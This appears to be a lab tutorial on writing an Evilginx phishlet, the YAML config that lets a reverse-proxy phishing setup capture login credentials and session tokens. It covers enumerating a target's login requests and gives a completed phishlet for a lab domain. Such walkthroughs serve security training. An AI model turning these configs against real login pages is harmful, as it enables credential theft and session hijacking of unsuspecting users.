A **phishlet** is a **YAML configuration file** that defines how to intercept and reproduce the behavior of a target website to steal credentials, cookies, or authentication tokens.

**Typical example:**

A phishlet for **login.microsoftonline.com** or **accounts.google.com** configures Evilginx to:

- Clone the login interface,
- Intercept HTTP/S requests,
- Extract sensitive information.

# Enumeration

Before even creating our phishlet, we must enumerate our target website, see how it works, and gather certain information.

- Go to the login page of the target website and create an account if you don't have one yet
- Once the account is created, log out
- Enable the `Network | Preserve log` option in the browser's developer tools
- Log in to your account and retrieve the following information from the sent requests:
	- Headers (`Request URL`, `Request Method`, `Content-Type`)
	- Payload (Data sent in POST)

# Creating the phishlet

Once all the information is gathered, make a copy of the `phishlets/example.yaml` file for your campaign and name this copy the same name as your target site (ex: `akira.yaml`)

The most important options in the `yaml` file are:

- `proxy_hosts`: Contains the list of all domains that the target site needs for reverse proxy, including subdomains and many others.
	- `domain`: Contains the main domain
	- `phish_sub` and `orig_sub`: Contain the subdomains linked to the main domain
	- `session:true`: Indicates the domain contains session cookies
	- `is_landing:true`: Allows redirecting a user to the original page

```yaml
{phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}
```

- `credentials`: These are the information sent when logging into the site (Present in the `Payload` part), these are `keys` that must be replaced according to the sent request

```yaml
credentials:
  username:
    key: 'email' # can change
    search: '(.*)'
    type: 'post'
  password:
    key: 'password' # can change
    search: '(.*)'
    type: 'post'
```

- `login`: The information where to send our campaign
       - `domain`: Contains the login domain, this can also be a subdomain like `login.target.com` | `akira.lab.evilginx.com`, it's the domain responsible for receiving the credentials through the form
    - `path`: Contains the URL path for the target site's login

```yaml
login:
  domain: 'akira.lab.evilginx.com'
  path: '/' # can be /login
```

- `auth_tokens`
    - `domain`: the domain of the cookie responsible for authentication
    - `keys`: the names of cookies, tokens to capture

```yaml
auth_tokens:
  - domain: 'akira.lab.evilginx.com'
    keys: ['token']
```

---

Here's what our target's Phishlet file looks like once completed

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}

sub_filters:
#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}

auth_tokens:
  - domain: 'akira.lab.evilginx.com'
    keys: ['token']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'akira.lab.evilginx.com'
  path: '/'
```


> Every time you make a modification to a phishlet, restart Evilginx
